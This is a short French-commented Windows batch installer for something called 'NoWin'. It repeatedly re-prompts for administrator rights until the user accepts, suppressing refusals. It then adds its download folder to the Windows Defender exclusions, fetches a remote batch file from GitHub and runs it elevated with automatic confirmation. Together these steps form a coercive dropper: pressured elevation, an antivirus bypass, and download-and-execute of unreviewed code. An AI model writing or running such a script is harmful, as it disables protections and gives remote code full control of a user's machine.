@echo off
setlocal
title Installation NoWin

:check_admin
:: On vérifie si on est admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    cls
    echo =====================================================
    echo   VEUILLEZ ACCEPTER LA DEMANDE D'ADMINISTRATEUR
    echo =====================================================
    echo.
    echo [!] En attente de validation...
    
    :: On tente l'élévation. Le "try/catch" capture l'erreur du "Non" pour ne rien afficher.
    powershell -Command "try { Start-Process '%~f0' -Verb RunAs -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    
    :: Petite pause pour éviter de boucler trop violemment sur le CPU
    timeout /t 2 >nul
    goto :check_admin
)

:: --- SI ON EST ICI, C'EST QU'ON A LES DROITS ---
cls
echo [OK] Droits administrateur obtenus.
echo [!] Lancement de la configuration en cours...

:: Exécution de ta commande PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$p = \"$env:USERPROFILE\Downloads\NoWin\"; ^
    if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; ^
    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; ^
    Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat' -OutFile \"$p\force-update-agent.bat\"; ^
    Start-Process \"$p\force-update-agent.bat\" -ArgumentList '--yes' -Verb RunAs"

echo [FIN] Script execute.
pause
exit
